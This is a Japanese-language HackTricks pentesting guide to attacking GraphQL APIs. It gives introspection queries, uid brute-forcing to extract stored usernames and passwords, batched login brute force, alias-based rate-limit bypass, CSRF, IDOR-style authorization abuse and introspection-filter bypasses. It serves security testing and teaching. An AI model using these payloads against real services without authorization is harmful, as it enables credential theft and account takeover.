# GraphQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## はじめに

GraphQLはREST APIの代替として機能します。REST APIでは、クライアントはバックエンドデータベースからデータをクエリするために複数のリクエストを異なるエンドポイントに送信する必要があります。GraphQLでは、バックエンドをクエリするために1つのリクエストのみを送信する必要があります。これは、複数のリクエストをAPIに送信する必要がないため、はるかにシンプルです。

## GraphQL

新しい技術が登場するにつれて、新しい脆弱性も登場します。**デフォルトでは**、GraphQLは**認証を実装していません**。これは、開発者が実装する必要があることを意味します。つまり、デフォルトではGraphQLは誰でもクエリでき、機密情報は認証されていない攻撃者に利用可能です。

ディレクトリブルートフォース攻撃を実行する際には、次のパスを追加してGraphQLインスタンスをチェックしてください。

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

オープンなGraphQLインスタンスを見つけたら、**どのクエリをサポートしているかを知る必要があります**。これは、内省システムを使用して行うことができます。詳細については、こちらを参照してください：[**GraphQL: A query language for APIs.**\
It’s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so…](https://graphql.org/learn/introspection/)

### フィンガープリント

ツール[**graphw00f**](https://github.com/dolevf/graphw00f)は、サーバーで使用されているGraphQLエンジンを検出し、セキュリティ監査人に役立つ情報を表示することができます。

#### ユニバーサルクエリ <a href="#universal-queries" id="universal-queries"></a>

GraphQLエンドポイントに`query{__typename}`を送信すると、レスポンスのどこかに`{"data": {"__typename": "query"}}`という文字列が含まれます。これはユニバーサルクエリと呼ばれ、URLがGraphQLサービスに対応しているかどうかを調査するための便利なツールです。

このクエリは、すべてのGraphQLエンドポイントには`__typename`という予約済みフィールドがあり、クエリされたオブジェクトのタイプを文字列として返すため機能します。

### 基本的な列挙

GraphQLは通常、**GET**、**POST**（x-www-form-urlencoded）、**POST**（json）をサポートしています。ただし、セキュリティのためにはCSRF攻撃を防ぐためにjsonのみを許可することが推奨されています。

#### 内省

スキーマ情報を発見するために内省を使用するには、`__schema`フィールドをクエリします。このフィールドはすべてのクエリのルートタイプで利用可能です。
```bash
query={__schema{types{name,fields{name}}}}
```
このクエリを使用すると、使用されているすべてのタイプの名前を見つけることができます：

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

このクエリを使用すると、すべてのタイプ、フィールド、および引数（および引数のタイプ）を抽出できます。これはデータベースのクエリ方法を知るために非常に役立ちます。

![](<../../.gitbook/assets/image (207) (3).png>)

**エラー**

**エラー**が**表示**されるかどうかを知ることは興味深いです。なぜなら、それらは有用な**情報**を提供するからです。
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**内省を介してデータベーススキーマを列挙する**

{% hint style="info" %}
内省が有効になっている場合でも、上記のクエリが実行されない場合は、クエリ構造から `onOperation`、`onFragment`、および `onField` の指示を削除してみてください。
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
インラインインスペクションクエリー：
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
最後のコード行は、GraphQLのメタ情報（オブジェクト名、パラメータ、タイプなど）をすべてダンプするGraphQLクエリです。

![](<../../.gitbook/assets/image (206).png>)

もしインスペクションが有効になっている場合、[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)を使用してGUIですべてのオプションを表示することができます。

### クエリング

データベース内に保存されている情報の種類がわかったので、いくつかの値を**抽出**してみましょう。

インスペクションで、**直接クエリを実行できるオブジェクト**（存在するだけではクエリできません）を見つけることができます。次の画像では、"_queryType_"が"_Query_"と呼ばれ、"_Query_"オブジェクトのフィールドの1つが"_flags_"であり、これもオブジェクトのタイプです。したがって、フラグオブジェクトをクエリできます。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

クエリ"_flags_"のタイプが"_Flags_"であることに注意してください。このオブジェクトは以下のように定義されています：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

"_Flags_"オブジェクトは**名前**と**値**で構成されていることがわかります。したがって、次のクエリですべてのフラグの名前と値を取得できます：
```javascript
query={flags{name, value}}
```
注意してください。クエリする**オブジェクト**が次の例のように**文字列**などの**プリミティブな型**である場合は、次のようにクエリすることができます。

![](<../../.gitbook/assets/image (441).png>)
```javascript
query={hiddenFlags}
```
別の例では、"_Query_"タイプオブジェクト内に2つのオブジェクトがある場合があります: "_user_"と"_users_"。\
これらのオブジェクトは検索に引数が必要ない場合、欲しいデータを要求するだけで**すべての情報を取得**することができます。このインターネットの例では、保存されたユーザー名とパスワードを抽出することができます:

![](<../../.gitbook/assets/image (208).png>)

しかし、この例ではそれを試みると、次の**エラー**が表示されます:

![](<../../.gitbook/assets/image (210).png>)

どうやら、何らかの方法で"_**uid**_"というタイプが_Int_の引数を使用して検索されるようです。\
とにかく、私たちはすでにそれを知っていました。[基本列挙](graphql.md#basic-enumeration)セクションでは、必要なすべての情報を表示するクエリが提案されていました: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

そのクエリを実行したときに提供された画像を読むと、"_**user**_"には_Int_タイプの"_**uid**_"という**arg**があることがわかります。

したがって、軽い**uid**ブルートフォースを実行すると、_**uid**=**1**_でユーザー名とパスワードが取得されることがわかりました:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

注意してください。私は"_**user**_"と"_**password**_"の**parameters**を要求できることを**発見**しました。なぜなら、存在しないものを探そうとすると(`query={user(uid:1){noExists}}`)、次のエラーが表示されるからです:

![](<../../.gitbook/assets/image (213).png>)

そして、**列挙フェーズ**中に、"_**dbuser**_"オブジェクトには"_**user**_"と"_**password**_"というフィールドがあることがわかりました。

**クエリ文字列のダンプトリック（@BinaryShadow\_さんに感謝）**

もし、`query={theusers(description: ""){username,password}}`のように文字列タイプで検索できる場合、空の文字列で検索すると**すべてのデータがダンプ**されます。（_この例はチュートリアルの例とは関係ありません。この例では、"**theusers**"という名前のStringフィールドの"**description**"を使用して検索できると仮定します。_）

GraphQLは比較的新しい技術であり、スタートアップや大企業の間で徐々に注目を集めています。デフォルトでは認証が不足しているため、GraphQLエンドポイントはIDORなどの他のバグにも脆弱性があります。

### 検索

この例では、メールアドレスと名前で識別される**人物**と、名前と評価で識別される**映画**のデータベースを想像してください。**人物**は他の**人物**と**友達**になることができ、人物は**映画を持つ**ことができます。

名前で人物を検索し、そのメールアドレスを取得することができます:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
次のようにして、名前で人物を検索し、彼らが購読している映画を取得することができます：

```graphql
query {
  person(name: "名前") {
    subscribedFilms
  }
}
```
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
次に、人物の`subscribedMovies`の`name`を取得する方法が示されていることに注目してください。

また、**同時に複数のオブジェクトを検索する**こともできます。この場合、2つの映画を検索します。
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
または、エイリアスを使用して複数の異なるオブジェクトの関係を表すこともできます:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### ミューテーション

**ミューテーションは、サーバーサイドでの変更を行うために使用されます。**

**インスペクション**では、**宣言されたミューテーション**を見つけることができます。以下の画像では、"_MutationType_"が"_Mutation_"と呼ばれ、"_Mutation_"オブジェクトにはミューテーションの名前（この場合は"_addPerson_"など）が含まれています。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

この例では、メールと名前で識別される**人物**と、名前と評価で識別される**映画**のデータベースを想定しています。**人物**は他の**人物**と**友達**になることができ、また、人物は**映画を持つ**ことができます。

データベース内に**新しい映画**を作成するためのミューテーションは、次のようになります（この例ではミューテーションは`addMovie`と呼ばれています）:
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**注意してください、クエリ内ではデータの値と型が示されています。**

また、**mutation** によって **persons** を **作成** することもあります（この例では `addPerson` と呼ばれます）。この場合、友達やファイルが存在している必要があります（友達やファイルに関連する人物を作成する前に）。
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### 1つのAPIリクエストでのバッチングブルートフォース

この情報は[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)から取得されました。\
**異なる認証情報を持つ多数のクエリを同時に送信**して認証を行うGraphQL API。これはクラシックなブルートフォース攻撃ですが、GraphQLのバッチング機能により、1つのHTTPリクエストに複数のログイン/パスワードペアを送信することが可能になりました。このアプローチにより、外部のレート監視アプリケーションはすべてが正常であり、パスワードを推測しようとするブルートフォースボットが存在しないと思い込まされます。

以下に、アプリケーションの認証リクエストの最も単純なデモンストレーションを示します。**一度に3つの異なるメール/パスワードペア**を送信しています。もちろん、同じ方法で1つのリクエストに数千のペアを送信することも可能です。

![](<../../.gitbook/assets/image (182) (1).png>)

レスポンスのスクリーンショットからわかるように、最初と3番目のリクエストは_null_を返し、_error_セクションに対応する情報を反映しています。**2番目のミューテーションは正しい認証**データを持ち、レスポンスには正しい認証セッショントークンが含まれています。

![](<../../.gitbook/assets/image (119) (1).png>)

## イントロスペクションなしのGraphQL

**GraphQLエンドポイントでのイントロスペクションの無効化**がますます増えています。ただし、予期しないリクエストが受信された場合にGraphQLがスローするエラーは、[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)などのツールによってスキーマの大部分を再作成するのに十分です。

さらに、Burp Suiteの拡張機能[**GraphQuail**](https://github.com/forcesunseen/graphquail)は、Burpを介して通過するGraphQL APIリクエストを**監視**し、新しいクエリごとに内部のGraphQL **スキーマ**を**構築**します。また、GraphiQLとVoyagerのためにスキーマを公開することもできます。この拡張機能は、イントロスペクションクエリを受け取った場合に偽のレスポンスを返します。その結果、GraphQuailはAPI内で使用できるすべてのクエリ、引数、およびフィールドを表示します。詳細については、[**こちらを参照してください**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

### GraphQLイントロスペクション防御のバイパス <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

テストしているAPIでイントロスペクションクエリを実行できない場合は、`__schema`キーワードの後に**特殊文字を挿入**してみてください。

イントロスペクションを無効にする開発者は、クエリ内の`__schema`キーワードを除外するために正規表現を使用する場合があります。GraphQLでは**スペース**、**改行**、**カンマ**などの文字は**無視**されますが、不正な正規表現では無視されません。

したがって、開発者が`__schema{`のみを除外した場合、以下のイントロスペクションクエリは除外されません。
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
もし動作しない場合は、代替のリクエストメソッドでプローブを実行してみてください。インロスペクションはPOSTでのみ無効になっている場合があります。GETリクエストや、`x-www-form-urlencoded`というコンテンツタイプを持つPOSTリクエストを試してみてください。

### 漏洩したGraphQLの構造

もしインロスペクションが無効になっている場合は、ウェブサイトのソースコードを確認してみてください。クエリはしばしばブラウザに事前に読み込まれたJavaScriptライブラリとして保存されています。これらの事前に書かれたクエリは、各オブジェクトや関数のスキーマと使用方法に関する重要な情報を明らかにすることがあります。開発者ツールの`Sources`タブでは、クエリが保存されているファイルを検索することができます。時には管理者保護されたクエリさえも既に公開されていることがあります。
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLにおけるCSRF

CSRFが何であるかわからない場合は、以下のページを読んでください：

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

そこでは、**CSRFトークンが設定されていない**いくつかのGraphQLエンドポイントを見つけることができます。

GraphQLリクエストは通常、Content-Type **`application/json`**を使用してPOSTリクエストで送信されます。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
ただし、ほとんどのGraphQLエンドポイントは**`form-urlencoded`のPOSTリクエスト**もサポートしています：
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
したがって、前述のようなCSRFリクエストは**プリフライトリクエストなしで**送信されるため、CSRFを悪用してGraphQLで**変更**を行うことが可能です。

ただし、Chromeの`samesite`フラグの新しいデフォルトクッキー値は`Lax`です。これは、クッキーがサードパーティのWebからのGETリクエストでのみ送信されることを意味します。

また、**クエリ**リクエストも**GET**リクエストとして送信することができ、GETリクエストではCSRFトークンが検証されない可能性があることに注意してください。

また、[**XS-Search**](../../pentesting-web/xs-search.md) **攻撃**を悪用することで、ユーザーの資格情報を悪用してGraphQLエンドポイントからコンテンツを外部に漏洩させることが可能です。

詳細については、[**こちらの元の投稿を参照してください**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)。

## GraphQLにおける認証

エンドポイントで定義された多くのGraphQL関数は、リクエスターの認証のみをチェックし、認可は行いません。

クエリの入力変数を変更することで、機密のアカウント詳細が[漏洩](https://hackerone.com/reports/792927)する可能性があります。

ミューテーションは、他のアカウントデータを変更しようとすることで、アカウント乗っ取りにつながる可能性さえあります。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLでの認証のバイパス

[クエリのチェーン](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)を使用すると、弱い認証システムをバイパスできます。

以下の例では、操作が「forgotPassword」であり、それに関連するforgotPasswordクエリのみが実行されるべきであることがわかります。これは、末尾にクエリを追加することでバイパスすることができます。この場合、"register"というクエリと、新しいユーザーとしてシステムに登録するためのユーザー変数を追加します。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## エイリアスを使用したレート制限のバイパス

通常、GraphQLオブジェクトには同じ名前の複数のプロパティを含めることはできません。エイリアスを使用すると、APIに返してほしいプロパティを**明示的に指定**することで、この制限をバイパスできます。エイリアスを使用すると、1つのリクエストで**同じタイプのオブジェクトの複数のインスタンス**を返すことができます。

GraphQLのエイリアスに関する詳細は、[エイリアス](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)を参照してください。

エイリアスは、必要なAPI呼び出しの数を制限するために意図されていますが、GraphQLエンドポイントをブルートフォースするためにも使用することができます。

多くのエンドポイントでは、ブルートフォース攻撃を防ぐために何らかの**レート制限装置**が設けられています。一部のレート制限装置は、エンドポイントで実行される操作の数ではなく、受信した**HTTPリクエストの数**に基づいて動作します。エイリアスは、実質的に1つのHTTPメッセージで複数のクエリを送信できるようにするため、この制限をバイパスできます。

以下は、**エイリアスを使用してストアの割引コードが有効かどうかを確認する**一連のエイリアス付きクエリの簡略化された例です。この操作は、1つのHTTPリクエストで行われるため、一度に膨大な数の割引コードをチェックすることができる可能性があり、レート制限をバイパスすることができます。
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## ツール

### 脆弱性スキャナー

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): スキーマを取得し、機密データを検索し、認証をテストし、スキーマをブルートフォース攻撃し、指定されたタイプへのパスを見つけるために使用できるツールキット。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): スタンドアロンまたは[Burp拡張](https://github.com/doyensec/inql)として使用できます。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLIクライアントとしても使用でき、攻撃を自動化するためにも使用できます。
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): GraphQLスキーマ内の特定のタイプに到達するさまざまな方法をリストするツール。

### クライアント

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUIクライアント
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUIクライアント

### 自動テスト

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQLの説明ビデオ: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考文献

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
